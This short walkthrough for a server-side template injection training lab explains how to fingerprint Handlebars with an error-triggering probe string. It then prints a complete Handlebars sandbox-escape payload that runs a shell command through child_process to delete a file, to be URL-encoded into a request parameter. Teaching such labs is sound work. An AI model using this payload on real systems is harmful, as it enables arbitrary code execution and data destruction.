Title: erver-side template injection in an unknown language with a documented exploit
Level: PRACTITIONER
Desc: This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. 

# Walkthrough:

a) Try to get first product, you'd see message parameter in URL, which you can control
b) TRY TO INJECT THIS: ${{<%[%'"}}%\, into the message parameter. In error message you will see, that site is using Handlebars.
b) search and find exploit as below

Modify this exploit so that it calls require("child_process").exec("rm /home/carlos/morale.txt") as follows:
```
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```
URL encode and add this to message param.
